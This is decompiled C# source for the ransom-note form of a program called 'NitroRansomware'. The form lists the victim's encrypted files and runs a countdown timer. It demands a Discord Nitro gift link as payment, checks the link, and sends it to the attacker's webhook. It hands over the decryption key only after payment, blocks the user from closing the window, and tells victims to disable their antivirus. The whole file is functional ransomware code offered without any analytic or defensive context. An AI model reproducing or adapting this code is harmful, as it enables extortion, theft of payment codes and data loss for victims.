using System;
using System.ComponentModel;
using System.Drawing;
using System.Timers;
using System.Windows.Forms;

namespace NitroRansomware;

public class Form1 : Form
{
	private Timer t;

	private int h = 3;

	private int m = 0;

	private int s = 0;

	private Webhook ww = new Webhook(Program.WEBHOOK);

	private IContainer components = null;

	private BackgroundWorker backgroundWorker1;

	private Label label1;

	private TextBox textBox1;

	private Label label3;

	private Panel panel1;

	private Panel panel2;

	private Label label4;

	private Button button1;

	private Label label5;

	private TextBox textBox3;

	private Label label6;

	private Button button2;

	private TextBox textBox2;

	private TextBox textBox4;

	private Label label7;

	private Label label9;

	private TextBox textBox5;

	private Panel panel3;

	private Label label10;

	private Label label2;

	private Label label8;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		t = new Timer();
		t.Interval = 1000.0;
		t.Elapsed += OnTimeEvent;
		t.Start();
		((Control)textBox5).set_Text("");
		foreach (string item in Crypto.encryptedFileLog)
		{
			TextBox obj = textBox5;
			((Control)obj).set_Text(((Control)obj).get_Text() + "Encrypted: " + item + "\r\n");
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		((CancelEventArgs)(object)e).Cancel = (int)e.get_CloseReason() == 3;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (NitroValid())
		{
			((Control)textBox3).set_Text(Crypto.fPassword);
			((Control)label7).set_Text("Paste your key here.");
			((Control)label7).set_ForeColor(Color.LightGreen);
			((Control)textBox4).set_Text("");
			((Control)label1).set_Text("");
			((Control)panel3).set_BackColor(Color.FromArgb(35, 39, 42));
			((Control)textBox1).set_Text("How to Decrypt files:\r\n Enter decryption key and click on Decrypt button. \n Make sure Windows Defender and any other antivirus is off.\r\n Do not close the application while decrypting or else files may get corrupted.");
			t.Stop();
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		string text = ((Control)textBox4).get_Text();
		if (text == Crypto.fPassword)
		{
			ww.Send("```User has entered correct decryption key.. Decrypting files.```");
			MessageBox.Show("Key is correct. Decrypting files...", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Crypto.inPassword = Crypto.fPassword;
			((Control)textBox5).set_Text("Decrypting files.. \r\nThis may take a while. Loading..");
			Cursor.set_Current(Cursors.get_WaitCursor());
			Program.DecryptAll();
			Cursor.set_Current(Cursors.get_Default());
			MessageBox.Show("Task complete. If there are files that have not been decrypted, make sure you turn off all antivirus and Windows Defender, then try decrypting again. \r\nIf it doesn't work, delete all Desktop.ini.givemenitro files that you see and try again.", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		else
		{
			MessageBox.Show("Invalid key", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void textBox5_TextChanged(object sender, EventArgs e)
	{
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void label8_Click(object sender, EventArgs e)
	{
	}

	private bool NitroValid()
	{
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
		Webhook webhook = new Webhook(Program.WEBHOOK);
		string text = ((Control)textBox2).get_Text();
		string empty = string.Empty;
		Console.WriteLine(text);
		if (text.Contains("discord.gift/"))
		{
			if (text.Contains("https://"))
			{
				int num = text.IndexOf("/");
				empty = text.Substring(num + 15);
				Console.WriteLine(empty);
			}
			else
			{
				int num2 = text.IndexOf("/");
				empty = text.Substring(num2 + 1);
				MessageBox.Show("Checking gift validity.. .", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			if (Nitro.Check(empty))
			{
				webhook.Send("**Valid nitro code was received**");
				webhook.Send(text);
				MessageBox.Show("Success! Valid nitro code was sent. Your decryption key is now available. You may start decrypting your files now.", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
				return true;
			}
			webhook.Send("```User sent invalid discord gift Link.```");
			MessageBox.Show("Invalid Nitro", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else
		{
			webhook.Send("```User sent invalid discord gift Link.```");
			MessageBox.Show("Please enter a Discord nitro gift in this format discord.gift/code here", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		return false;
	}

	private void OnTimeEvent(object sender, ElapsedEventArgs e)
	{
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			if (s < 1)
			{
				s = 59;
				if (m == 0)
				{
					m = 59;
					if (h != 0)
					{
						h--;
					}
				}
				else
				{
					m--;
				}
			}
			else
			{
				s--;
			}
			if (s != 0 || m != 0 || h != 0)
			{
			}
			((Control)label10).set_Text($"{h.ToString().PadLeft(2, '0')}:{m.ToString().PadLeft(2, '0')}:{s.ToString().PadLeft(2, '0')}");
		});
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Expected O, but got Unknown
		//IL_016a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0203: Unknown result type (might be due to invalid IL or missing references)
		//IL_020d: Expected O, but got Unknown
		//IL_0241: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0307: Expected O, but got Unknown
		//IL_0338: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_045e: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c4: Expected O, but got Unknown
		//IL_04f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0583: Unknown result type (might be due to invalid IL or missing references)
		//IL_0610: Unknown result type (might be due to invalid IL or missing references)
		//IL_061a: Expected O, but got Unknown
		//IL_064b: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_0761: Unknown result type (might be due to invalid IL or missing references)
		//IL_076b: Expected O, but got Unknown
		//IL_079f: Unknown result type (might be due to invalid IL or missing references)
		//IL_082a: Unknown result type (might be due to invalid IL or missing references)
		//IL_08eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_099a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a13: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a1d: Expected O, but got Unknown
		//IL_0a51: Unknown result type (might be due to invalid IL or missing references)
		//IL_0abe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac8: Expected O, but got Unknown
		//IL_0afc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b7c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b86: Expected O, but got Unknown
		//IL_0bb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c83: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ce3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ced: Expected O, but got Unknown
		//IL_0d1b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d88: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d92: Expected O, but got Unknown
		//IL_0dc3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e2c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e36: Expected O, but got Unknown
		//IL_0e67: Unknown result type (might be due to invalid IL or missing references)
		//IL_105b: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		backgroundWorker1 = new BackgroundWorker();
		label1 = new Label();
		textBox1 = new TextBox();
		label3 = new Label();
		panel1 = new Panel();
		panel2 = new Panel();
		label4 = new Label();
		button1 = new Button();
		label5 = new Label();
		textBox3 = new TextBox();
		label6 = new Label();
		button2 = new Button();
		textBox2 = new TextBox();
		textBox4 = new TextBox();
		label7 = new Label();
		label9 = new Label();
		textBox5 = new TextBox();
		panel3 = new Panel();
		label10 = new Label();
		label2 = new Label();
		label8 = new Label();
		((Control)panel2).SuspendLayout();
		((Control)panel3).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(33, 23));
		((Control)label1).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(720, 46));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text(" Oh no! Your files have been encrypted.");
		((Control)label1).add_Click((EventHandler)label1_Click);
		((Control)textBox1).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)0);
		((Control)textBox1).set_Font(new Font("Segoe UI", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(SystemColors.MenuBar);
		((Control)textBox1).set_Location(new Point(539, 165));
		((Control)textBox1).set_Margin(new Padding(4, 4, 4, 4));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		textBox1.set_ScrollBars((ScrollBars)2);
		((Control)textBox1).set_Size(new Size(493, 356));
		((Control)textBox1).set_TabIndex(3);
		((Control)textBox1).set_TabStop(false);
		((Control)textBox1).set_Text(componentResourceManager.GetString("textBox1.Text"));
		((Control)textBox1).add_TextChanged((EventHandler)textBox1_TextChanged);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Segoe UI", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(SystemColors.Control);
		((Control)label3).set_Location(new Point(169, 118));
		((Control)label3).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(188, 32));
		((Control)label3).set_TabIndex(6);
		((Control)label3).set_Text("Time Remaining");
		((Control)panel1).set_BackColor(Color.FromArgb(35, 39, 42));
		((Control)panel1).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)panel1).set_Location(new Point(-1, -5));
		((Control)panel1).set_Margin(new Padding(4, 4, 4, 4));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(1076, 39));
		((Control)panel1).set_TabIndex(4);
		((Control)panel2).set_BackColor(Color.FromArgb(35, 39, 42));
		((Control)panel2).get_Controls().Add((Control)(object)label1);
		((Control)panel2).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)panel2).set_Location(new Point(116, -1));
		((Control)panel2).set_Margin(new Padding(4, 4, 4, 4));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(817, 82));
		((Control)panel2).set_TabIndex(7);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Segoe UI", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(SystemColors.Control);
		((Control)label4).set_Location(new Point(112, 559));
		((Control)label4).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(179, 19));
		((Control)label4).set_TabIndex(9);
		((Control)label4).set_Text("Enter Discord Nitro giftcode");
		((Control)button1).set_BackColor(SystemColors.ButtonHighlight);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Location(new Point(344, 591));
		((Control)button1).set_Margin(new Padding(4, 4, 4, 4));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(100, 28));
		((Control)button1).set_TabIndex(10);
		((Control)button1).set_Text("Get Key");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Segoe UI", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(SystemColors.Control);
		((Control)label5).set_Location(new Point(112, 647));
		((Control)label5).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(149, 19));
		((Control)label5).set_TabIndex(11);
		((Control)label5).set_Text("Your Decryption key is:");
		((Control)textBox3).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox3).set_BorderStyle((BorderStyle)1);
		((Control)textBox3).set_ForeColor(SystemColors.Window);
		((Control)textBox3).set_Location(new Point(95, 671));
		((Control)textBox3).set_Margin(new Padding(4, 4, 4, 4));
		((Control)textBox3).set_Name("textBox3");
		((TextBoxBase)textBox3).set_ReadOnly(true);
		((Control)textBox3).set_Size(new Size(270, 22));
		((Control)textBox3).set_TabIndex(12);
		((Control)textBox3).set_TabStop(false);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Segoe UI", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(SystemColors.Control);
		((Control)label6).set_Location(new Point(733, 551));
		((Control)label6).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(103, 23));
		((Control)label6).set_TabIndex(13);
		((Control)label6).set_Text("Decrypt files");
		((Control)button2).set_BackColor(SystemColors.ButtonHighlight);
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_Location(new Point(876, 635));
		((Control)button2).set_Margin(new Padding(4, 4, 4, 4));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(100, 28));
		((Control)button2).set_TabIndex(15);
		((Control)button2).set_Text("Decrypt files");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)textBox2).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox2).set_BorderStyle((BorderStyle)1);
		((Control)textBox2).set_ForeColor(SystemColors.Window);
		((Control)textBox2).set_Location(new Point(65, 593));
		((Control)textBox2).set_Margin(new Padding(4, 4, 4, 4));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(270, 22));
		((Control)textBox2).set_TabIndex(8);
		((Control)textBox2).set_TabStop(false);
		((Control)textBox2).set_Text("discord.gift/example");
		((Control)textBox4).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox4).set_BorderStyle((BorderStyle)1);
		((Control)textBox4).set_ForeColor(SystemColors.Window);
		((Control)textBox4).set_Location(new Point(597, 635));
		((Control)textBox4).set_Margin(new Padding(4, 4, 4, 4));
		((Control)textBox4).set_Name("textBox4");
		((Control)textBox4).set_Size(new Size(270, 22));
		((Control)textBox4).set_TabIndex(17);
		((Control)textBox4).set_TabStop(false);
		((Control)textBox4).set_Text("send discord nitro to get key");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Segoe UI", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(SystemColors.Control);
		((Control)label7).set_Location(new Point(593, 597));
		((Control)label7).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(278, 19));
		((Control)label7).set_TabIndex(16);
		((Control)label7).set_Text("Warning: Do not try guessing the password.");
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Font(new Font("Segoe UI", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label9).set_ForeColor(SystemColors.Control);
		((Control)label9).set_Location(new Point(232, 405));
		((Control)label9).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(38, 23));
		((Control)label9).set_TabIndex(19);
		((Control)label9).set_Text("Log");
		((Control)textBox5).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox5).set_BorderStyle((BorderStyle)0);
		((Control)textBox5).set_Font(new Font("Segoe UI", 7.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox5).set_ForeColor(SystemColors.MenuBar);
		((Control)textBox5).set_Location(new Point(47, 448));
		((Control)textBox5).set_Margin(new Padding(4, 4, 4, 4));
		((TextBoxBase)textBox5).set_Multiline(true);
		((Control)textBox5).set_Name("textBox5");
		((TextBoxBase)textBox5).set_ReadOnly(true);
		textBox5.set_ScrollBars((ScrollBars)2);
		((Control)textBox5).set_Size(new Size(463, 73));
		((Control)textBox5).set_TabIndex(20);
		((Control)textBox5).set_TabStop(false);
		((Control)textBox5).add_TextChanged((EventHandler)textBox5_TextChanged);
		((Control)panel3).set_BackColor(Color.Crimson);
		((Control)panel3).get_Controls().Add((Control)(object)label10);
		((Control)panel3).set_Location(new Point(47, 165));
		((Control)panel3).set_Margin(new Padding(4, 4, 4, 4));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(463, 219));
		((Control)panel3).set_TabIndex(21);
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Font(new Font("Microsoft Sans Serif", 50f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_ForeColor(SystemColors.ControlLightLight);
		((Control)label10).set_Location(new Point(31, 58));
		((Control)label10).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(368, 95));
		((Control)label10).set_TabIndex(22);
		((Control)label10).set_Text("00:00:00");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Segoe UI", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(SystemColors.Control);
		((Control)label2).set_Location(new Point(737, 118));
		((Control)label2).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(57, 32));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text("Info");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Segoe UI", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(SystemColors.Control);
		((Control)label8).set_Location(new Point(497, 118));
		((Control)label8).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(57, 32));
		((Control)label8).set_TabIndex(22);
		((Control)label8).set_Text("Info");
		((Control)label8).add_Click((EventHandler)label8_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(44, 47, 51));
		((Form)this).set_ClientSize(new Size(1067, 738));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)panel3);
		((Control)this).get_Controls().Add((Control)(object)textBox5);
		((Control)this).get_Controls().Add((Control)(object)label9);
		((Control)this).get_Controls().Add((Control)(object)textBox4);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)panel2);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).set_ForeColor(SystemColors.ControlText);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Margin(new Padding(4, 4, 4, 4));
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((Control)panel3).ResumeLayout(false);
		((Control)panel3).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
